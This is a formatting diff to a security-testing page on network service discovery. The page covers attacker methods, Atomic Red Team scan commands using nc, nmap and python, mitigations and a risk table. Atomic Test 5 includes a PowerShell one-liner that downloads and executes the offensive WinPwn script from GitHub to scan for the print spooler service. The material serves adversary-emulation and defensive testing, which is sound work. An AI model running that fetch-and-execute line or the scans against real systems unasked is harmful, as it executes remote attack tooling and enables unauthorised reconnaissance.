@@ -36,10 +36,8 @@ tech_stack:
   - windows
 cwe_ids:
   - CWE-200
-chains_with:
-  []
-prerequisites:
-  []
+chains_with: []
+prerequisites: []
 severity_boost: {}
 ---
 
@@ -47,11 +45,11 @@ severity_boost: {}
 
 ## High-Level Description
 
-Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system. 
+Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.
 
 Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.
 
-Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.
+Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B \_ssh.\_tcp .</code>) to find other systems broadcasting the ssh service.
 
 ## Kill Chain Phase
 
@@ -101,6 +99,7 @@ nc -nv #{host} #{port}
 ```
 
 **Dependencies:**
+
 - Check if nmap command exists on the machine
 - Check if nc command exists on the machine
 - Check if telnet command exists on the machine
@@ -117,6 +116,7 @@ nmap #{host_to_scan}
 ```
 
 **Dependencies:**
+
 - NMap must be installed
 
 ### Atomic Test 4: Port Scan using python
@@ -130,6 +130,7 @@ python "#{filename}" -i #{host_ip}
 ```
 
 **Dependencies:**
+
 - Check if python exists on the machine
 
 ### Atomic Test 5: WinPwn - spoolvulnscan
@@ -142,7 +143,6 @@ Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 spoolvulnscan -noninteractive -consoleoutput
 ```
-
 
 ### Manual Testing
 
@@ -157,32 +157,32 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1042 Disable or Remove Feature or Program
+
 Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation.
 
 ### M1031 Network Intrusion Prevention
+
 Use network intrusion detection/prevention systems to detect and prevent remote service scans.
 
 ### M1030 Network Segmentation
-Ensure proper network segmentation is followed to protect critical servers and devices.
 
+Ensure proper network segmentation is followed to protect critical servers and devices.
 
 ## Detection
 
 ### Behavioral Detection Strategy for Network Service Discovery Across Platforms
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Network Service Discovery technique applicable | High | Discovery |
+| Finding                                        | Severity | Impact    |
+| ---------------------------------------------- | -------- | --------- |
+| Network Service Discovery technique applicable | High     | Discovery |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
